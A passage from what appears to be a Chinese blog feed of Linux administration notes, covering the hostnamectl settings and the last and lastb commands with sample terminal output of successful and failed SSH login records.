Cloud<br>  Hardware <span class="hljs-attribute">Model</span>: Alibaba Cloud ECS<br><br>root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl set-chassis <span class="hljs-string">&#x27;&#x27;</span><br>root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl<br> Static <span class="hljs-attribute">hostname</span>: iZbp1191gh7vw52537lyxrZ<br> Pretty <span class="hljs-attribute">hostname</span>: aliyun#@##@<br>       Icon <span class="hljs-attribute">name</span>: computer-vm<br>         <span class="hljs-attribute">Chassis</span>: vm<br>      Machine <span class="hljs-attribute">ID</span>: <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-attribute">ID</span>: <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-attribute">Virtualization</span>: kvm<br>Operating <span class="hljs-attribute">System</span>: Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>          <span class="hljs-attribute">Kernel</span>: Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">73</span>-generic<br>    <span class="hljs-attribute">Architecture</span>: x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-attribute">Vendor</span>: Alibaba Cloud<br>  Hardware <span class="hljs-attribute">Model</span>: Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><h4 id="set-deployment-deployment-ENVIRONMENT"><a href="#set-deployment-deployment-ENVIRONMENT" class="headerlink" title="set-deployment&#x2F;deployment ENVIRONMENT"></a>set-deployment&#x2F;deployment ENVIRONMENT</h4><p>设置环境描述</p><p>ENVIRONMENT 不可以包含控制字符</p><p>ENVIRONMENT 建议的值：</p><p>development</p><p>integration</p><p>staging</p><p>production</p><p>ENVIRONMENT  为空’’的时候，会重置为默认值</p><h4 id="set-location-location-LOCATION"><a href="#set-location-location-LOCATION" class="headerlink" title="set-location&#x2F;location LOCATION"></a>set-location&#x2F;location LOCATION</h4><p>设置设备所处位置</p><p>LOCATION 为空’’的时候，会重置为默认值</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>last-lastb</title>
    <link href="/2024/03/15/yunwei/yunweicommands/Linuxcommands/last&amp;lastb/"/>
    <url>/2024/03/15/yunwei/yunweicommands/Linuxcommands/last&amp;lastb/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="last"><a href="#last" class="headerlink" title="last"></a>last</h1><p>last命令会读取用户登录日志内容展示出来，默认&#x2F;var&#x2F;log&#x2F;wtmp，也可以通过 -f 来指定文件</p><h2 id="参数描述"><a href="#参数描述" class="headerlink" title="参数描述"></a>参数描述</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>last [-R] [-num] [ -n num ] [-adFiowx] [ -f file ] [ -t YYYYMMDDHHMMSS ] [name…]  [tty…]</p><p>-f file:指定读取的文件，默认为&#x2F;var&#x2F;log&#x2F;wtmp</p><p>-num</p><p>-n num :显示多少行的数据</p><p>-R:禁止显示主机名</p><p>-a:最后一列显示源主机名</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> <span class="hljs-built_in">log</span>]<span class="hljs-meta"># last -n 10 -a</span><br>root     pts/<span class="hljs-number">1</span>        Tue Nov <span class="hljs-number">16</span> <span class="hljs-number">20</span>:<span class="hljs-number">23</span>   still logged <span class="hljs-keyword">in</span>    <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><p>-d:最后一列替换为源主机IP</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> <span class="hljs-built_in">log</span>]<span class="hljs-meta"># last -n 10 -a -d</span><br>root     pts/<span class="hljs-number">1</span>        Tue Nov <span class="hljs-number">16</span> <span class="hljs-number">20</span>:<span class="hljs-number">23</span>   still logged <span class="hljs-keyword">in</span>    <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><p>-F:登录时间，推出时间完整展示</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@110 log]<span class="hljs-comment"># last -n 10 -a -d -F</span><br>root     pts/1        Tue Nov<span class="hljs-number"> 16 </span>20:23:07<span class="hljs-number"> 2021 </span>  still logged in                       1.1.1.1<br>root     pts/0        Tue Nov<span class="hljs-number"> 16 </span>09:35:43<span class="hljs-number"> 2021 </span>  still logged in                       1.1.1.1<br>root     pts/0        Mon Nov<span class="hljs-number"> 15 </span>16:16:36<span class="hljs-number"> 2021 </span>- Mon Nov<span class="hljs-number"> 15 </span>19:30:01<span class="hljs-number"> 2021 </span> (03:13)     1.1.1.1<br>reboot   system boot  Tue Nov<span class="hljs-number"> 16 </span>00:14:47<span class="hljs-number"> 2021 </span>- Tue Nov<span class="hljs-number"> 16 </span>20:50:34<span class="hljs-number"> 2021 </span> (20:35)     0.0.0.0<br>root     pts/1        Mon Nov<span class="hljs-number"> 15 </span>15:38:35<span class="hljs-number"> 2021 </span>- down                      (00:36)     1.1.1.1<br>root     pts/0        Mon Nov<span class="hljs-number"> 15 </span>15:08:20<span class="hljs-number"> 2021 </span>- down                      (01:06)     1.1.1.1<br>root     pts/1        Thu Nov<span class="hljs-number"> 11 </span>20:55:21<span class="hljs-number"> 2021 </span>- Thu Nov<span class="hljs-number"> 11 </span>23:11:33<span class="hljs-number"> 2021 </span> (02:16)     1.1.1.1<br></code></pre></td></tr></table></figure><p>命令读取的文件：</p><p>&#x2F;var&#x2F;log&#x2F;wtmp</p><p>该文件为二进制文件，无法直接用cat查看</p><h2 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>lastb命令和last命令类似，默认&#x2F;var&#x2F;log&#x2F;btmp，会显示所有登录记录（成功+失败）</p><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>lastb [-R] [-num] [ -n num ] [ -f file ] [-adFiowx] [name…]  [tty…]</p><h4 id="lastb-1"><a href="#lastb-1" class="headerlink" title="lastb"></a>lastb</h4><p>显示登录失败的用户信息</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ log]# lastb | more<br>         ssh:notty    175.24.152.224   Thu Aug 25 04:36 - 04:36  (00:00)<br>git      ssh:notty    60.171.76.133    Thu Aug 25 02:59 - 02:59  (00:00)<br>git      ssh:notty    60.171.76.133    Thu Aug 25 02:59 - 02:59  (00:00)<br>psxtg    ssh:notty    192.46.210.172   Wed Aug 24 19:23 - 19:23  (00:00)<br>scdva    ssh:notty    195.96.137.7     Wed Aug 24 17:40 - 17:40  (00:00)<br>         ssh:notty    110.42.200.114   Wed Aug 24 15:14 - 15:14  (00:00)<br>         ssh:notty    175.24.152.224   Wed Aug 24 11:30 - 11:30  (00:00)<br>         ssh:notty    110.42.200.114   Tue Aug 23 18:12 - 18:12  (00:00)<br>root     ssh:notty    201.213.185.243  Tue Aug 23 04:32 - 04:32  (00:00)<br>         ssh:notty    42.194.144.103   Tue Aug 23 00:07 - 00:07  (00:00)<br>username ssh:notty    183.136.225.14   Mon Aug 22 22:53 - 22:53  (00:00)<br>         ssh:notty    65.49.20.68      Mon Aug 22 15:54 - 15:54  (00:00)<br>         ssh:notty    110.42.200.114   Mon Aug 22 13:18 - 13:18  (00:00)<br>test1    pts/2        Thu Aug 18 23:53 - 23:53  (00:00)<br>         ssh:notty    Thu Aug 18 23:38 - 23:38  (00:00)<br><span class="hljs-keyword">test     </span>pts/3        Thu Aug 18 23:24 - 23:24  (00:00)<br><span class="hljs-keyword">test     </span>pts/1        Thu Aug 18 23:11 - 23:11  (00:00)<br>...<br>btmp begins Mon Aug  1 18:23:34 2022<br></code></pre></td></tr></table></figure><h4 id="lastb-d-将IP转换为主机名显示"><a href="#lastb-d-将IP转换为主机名显示" class="headerlink" title="lastb -d 将IP转换为主机名显示"></a>lastb -d 将IP转换为主机名显示</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span>#  <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">-d</span><br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">175.24</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.224</span>   <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">psxtg</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">192</span><span class="hljs-selector-tag">-46-210-172</span><span class="hljs-selector-class">.i</span> <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">scdva</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">195.96</span><span class="hljs-selector-class">.137</span><span class="hljs-selector-class">.7</span>     <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">110.42</span><span class="hljs-selector-class">.200</span><span class="hljs-selector-class">.114</span>   <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">15</span>:<span class="hljs-number">14</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">15</span>:<span class="hljs-number">14</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">175.24</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.224</span>   <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">11</span>:<span class="hljs-number">30</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">11</span>:<span class="hljs-number">30</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">110.42</span><span class="hljs-selector-class">.200</span><span class="hljs-selector-class">.114</span>   <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">18</span>:<span class="hljs-number">12</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">18</span>:<span class="hljs-number">12</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">201.213</span><span class="hljs-selector-class">.185</span><span class="hljs-selector-class">.243</span>. <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">42.194</span><span class="hljs-selector-class">.144</span><span class="hljs-selector-class">.103</span>   <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">00</span>:<span class="hljs-number">07</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">00</span>:<span class="hljs-number">07</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">username</span> <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">183.136</span><span class="hljs-selector-class">.225</span><span class="hljs-selector-class">.14</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">22</span> <span class="hljs-number">22</span>:<span class="hljs-number">53</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">22</span>:<span class="hljs-number">53</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">scan-19</span><span class="hljs-selector-class">.shadowse</span> <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">22</span> <span class="hljs-number">15</span>:<span class="hljs-number">54</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">15</span>:<span class="hljs-number">54</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">110.42</span><span class="hljs-selector-class">.200</span><span class="hljs-selector-class">.114</span>   <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">22</span> <span class="hljs-number">13</span>:<span class="hljs-number">18</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">13</span>:<span class="hljs-number">18</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-f-filename-读取指定文件记录"><a href="#lastb-f-filename-读取指定文件记录" class="headerlink" title="lastb -f filename 读取指定文件记录"></a>lastb -f filename 读取指定文件记录</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">[root@iZbp1191gh7vw52537lyxrZ log]<span class="hljs-comment"># lastb -f btmp-20220801</span><br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">65</span>.<span class="hljs-number">49</span>.<span class="hljs-number">20</span>.<span class="hljs-number">68</span>      Sat <span class="hljs-keyword">Jul </span><span class="hljs-number">30</span> <span class="hljs-number">09</span>:<span class="hljs-number">47</span> - <span class="hljs-number">09</span>:<span class="hljs-number">47</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-keyword">jvipu </span>   ssh:notty    <span class="hljs-number">45</span>.<span class="hljs-number">33</span>.<span class="hljs-number">65</span>.<span class="hljs-number">249</span>     Fri <span class="hljs-keyword">Jul </span><span class="hljs-number">29</span> <span class="hljs-number">08</span>:<span class="hljs-number">25</span> - <span class="hljs-number">08</span>:<span class="hljs-number">25</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">178</span>.<span class="hljs-number">73</span>.<span class="hljs-number">215</span>.<span class="hljs-number">171</span>   Fri <span class="hljs-keyword">Jul </span><span class="hljs-number">29</span> <span class="hljs-number">06</span>:<span class="hljs-number">11</span> - <span class="hljs-number">06</span>:<span class="hljs-number">11</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">64</span>.<span class="hljs-number">62</span>.<span class="hljs-number">197</span>.<span class="hljs-number">227</span>    Wed <span class="hljs-keyword">Jul </span><span class="hljs-number">27</span> <span class="hljs-number">11</span>:<span class="hljs-number">52</span> - <span class="hljs-number">11</span>:<span class="hljs-number">52</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-symbol">         ssh:</span>notty    <span class="hljs-number">64</span>.<span class="hljs-number">62</span>.<span class="hljs-number">197</span>.<span class="hljs-number">227</span>    Tue <span class="hljs-keyword">Jul </span><span class="hljs-number">26</span> <span class="hljs-number">22</span>:<span class="hljs-number">16</span> - <span class="hljs-number">22</span>:<span class="hljs-number">16</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br>root     ssh:notty    <span class="hljs-number">39</span>.<span class="hljs-number">174</span>.<span class="hljs-number">65</span>.<span class="hljs-number">227</span>    Tue <span class="hljs-keyword">Jul </span><span class="hljs-number">26</span> <span class="hljs-number">03</span>:<span class="hljs-number">31</span> - <span class="hljs-number">03</span>:<span class="hljs-number">31</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><br><span class="hljs-keyword">btmp-20220801 </span><span class="hljs-keyword">begins </span>Fri <span class="hljs-keyword">Jul </span> <span class="hljs-number">1</span> <span class="hljs-number">03</span>:<span class="hljs-number">55</span>:<span class="hljs-number">47</span> <span class="hljs-number">2022</span><br></code></pre></td></tr></table></figure><h4 id="lastb-n-num-lastb-nnum-显示指定行数"><a href="#lastb-n-num-lastb-nnum-显示指定行数" class="headerlink" title="lastb -n num&#x2F;lastb -nnum 显示指定行数"></a>lastb -n num&#x2F;lastb -nnum 显示指定行数</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ log]<span class="hljs-comment"># last -n 2</span><br>root     pts/0        218.30.113.53    Thu Aug<span class="hljs-number"> 25 </span>09:31   still logged in<br>root     pts/1        125.33.205.114   Wed Aug<span class="hljs-number"> 24 </span>23:47 - 00:17  (00:30)<br><br>wtmp begins Tue Nov<span class="hljs-number"> 30 </span>15:31:43 2021<br>[root@iZbp1191gh7vw52537lyxrZ log]<span class="hljs-comment"># last -n2</span><br>root     pts/0        218.30.113.53    Thu Aug<span class="hljs-number"> 25 </span>09:31   still logged in<br>root     pts/1        125.33.205.114   Wed Aug<span class="hljs-number"> 24 </span>23:47 - 00:17  (00:30)<br><br>wtmp begins Tue Nov<span class="hljs-number"> 30 </span>15:31:43 2021<br></code></pre></td></tr></table></figure><h4 id="lastb-R-不显示主机名或IP"><a href="#lastb-R-不显示主机名或IP" class="headerlink" title="lastb -R 不显示主机名或IP"></a>lastb -R 不显示主机名或IP</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span># <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">-R</span><br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">psxtg</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">scdva</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-x-显示系统关机，重新开机，以及执行等级的改变等信息"><a href="#lastb-x-显示系统关机，重新开机，以及执行等级的改变等信息" class="headerlink" title="lastb -x 显示系统关机，重新开机，以及执行等级的改变等信息"></a>lastb -x 显示系统关机，重新开机，以及执行等级的改变等信息</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span># <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">-x</span><br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">175.24</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.224</span>   <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">02</span>:<span class="hljs-number">59</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">psxtg</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">192.46</span><span class="hljs-selector-class">.210</span><span class="hljs-selector-class">.172</span>   <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">19</span>:<span class="hljs-number">23</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">scdva</span>    <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">195.96</span><span class="hljs-selector-class">.137</span><span class="hljs-selector-class">.7</span>     <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">24</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">17</span>:<span class="hljs-number">40</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><h4 id="lastb-username-显示指定用户的记录"><a href="#lastb-username-显示指定用户的记录" class="headerlink" title="lastb username 显示指定用户的记录"></a>lastb username 显示指定用户的记录</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span># <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">root</span><br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">201.213</span><span class="hljs-selector-class">.185</span><span class="hljs-selector-class">.243</span>  <span class="hljs-selector-tag">Tue</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">23</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">root</span>     <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    